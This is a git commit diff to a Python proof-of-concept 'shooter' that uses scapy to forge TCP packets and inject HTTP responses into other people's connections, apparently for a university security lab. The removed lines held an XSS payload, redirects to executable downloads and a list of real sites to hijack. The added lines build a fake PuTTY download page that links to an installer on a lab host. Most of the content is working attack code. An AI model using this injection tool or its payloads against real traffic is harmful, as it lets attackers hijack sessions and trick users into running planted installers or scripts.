6b7f347b2ba47934a05f62002afbeaf12afae012
Van Thong Nguyen <tom@gridscale.io>
2021-05-03 19:45:24 +0200

    update payload

--- poc/shooter.py
+++ poc/shooter.py
@@ -8,7 +8,7 @@
 
 # Python imports
 from monitor import QuantumTip, TIP_LEN, TIP_STRUCT
-from scapy.all import IP, TCP, conf
+from scapy.all import *
 import sys
 import struct
 import socket
@@ -19,16 +19,11 @@ import logging
 logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
 
 # Local imports
-
-# Example QI payloads
-PAYLOAD_BANG = "BANG! BANG! BANG! BANG! BANG! BANG!\r\n" * 8
-PAYLOAD_FOX = "HTTP/1.1 302 Found\r\nLocation: http://fox-it.com/\r\nContent-Length: 0\r\n\r\n"
-PAYLOAD_7ZIP = "HTTP/1.1 302 Found\r\nLocation: http://www.7-zip.org/a/7z938.exe\r\nContent-Length: 0\r\n\r\n"
-
-XSS = 'alert("QUANTUM INSERT!");'
-# XSS = 'alert("QUANTUM DPIC!"); window.onload = function(){$("img").attr("src", "http://i.imgur.com/CE4r5vR.jpg");};'
-PAYLOAD_XSS = 'HTTP/1.1 200 OK\r\nContent-Type: text/javascript\r\nConnection: close\r\nContent-Length: ' + \
-    str(len(XSS)) + "\r\n\r\n" + XSS
+PAYLOAD_PUTTY_BODY = '<!doctype html>\r\n<html lang="en">\r\n<head>\r\n<meta charset="utf-8">\r\n<title>NetSec PuTTY download</title>\r\n</head>\r\n<body>\r\n<h1>NetSec PuTTY Client Download</h1>\r\n<p>Download our secure PuTTY client here:</p>\r\n<p id="putty_download"><a href="http://cantillon.netsec.seclab-bonn.de/putty-64bit-0.71-installer.msi">putty-64bit-0.71-installer.msi</a> (SHA-256: 3aa8298ce09fe005b1da2f91f84ab13623a35684ecae5537b5b5f4235bd99720)</p>\r\n<p>Do not forget to verify the hash after downloading the installer CCCCCCCCCCCC!</p>\r\n</body>\r\n</html>\r\n'
+PAYLOAD_PUTTY_HEADER = 'HTTP/1.1 200 OK\r\nServer: nginx\r\nDate: Mon, 03 May 2021 17:29:05 GMT\r\nContent-Type: text/html\r\nContent-Length: ' + \
+    str(len(PAYLOAD_PUTTY_BODY)) + \
+    '\r\nLast-Modified: Wed, 14 Apr 2021 14:47:45 GMT\r\nConnection: keep-alive\r\nETag: "60770091-208"\r\nAccept-Ranges: bytes\r\n\r\n'
+PAYLOAD_PUTTY = PAYLOAD_PUTTY_HEADER + PAYLOAD_PUTTY_BODY
 
 
 class QI(object):
@@ -36,13 +31,12 @@ class QI(object):
 
     def __init__(self, selectors):
         self.selectors = selectors
-        self.sock = conf.L3socket()
 
     def inject(self, src, dst, sport, dport, seq, ack):
-        payload = self.selectors.get(src, PAYLOAD_BANG)
+        payload = PAYLOAD_PUTTY
         p = IP(src=src, dst=dst) / TCP(sport=sport, dport=dport,
                                        seq=seq+1, ack=ack, flags="PA") / payload
-        self.sock.send(p)
+        send(p)
         print('Shooting: %r' % p)
 
 
@@ -55,17 +49,6 @@ def main():
                         help="listen on specified (udp) port")
 
     args = parser.parse_args()
-
-    qi = QI({
-        "96.126.98.124": PAYLOAD_BANG,  # www.jsonip.com
-        "91.225.248.129": PAYLOAD_FOX,  # www.linkedin.com
-        "216.34.181.45": PAYLOAD_FOX,   # slashdot.org
-        # http://the.earth.li/~sgtatham/putty/latest/x86/putty.exe
-        "46.43.34.31": PAYLOAD_7ZIP,
-        # http://platform.twitter.com/widgets.js (loaded by imgur.com)
-        "199.96.57.6": PAYLOAD_XSS,
-        "10.3.3.52": PAYLOAD_BANG,
-    })
 
     sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
     sock.bind((args.listen, args.port))
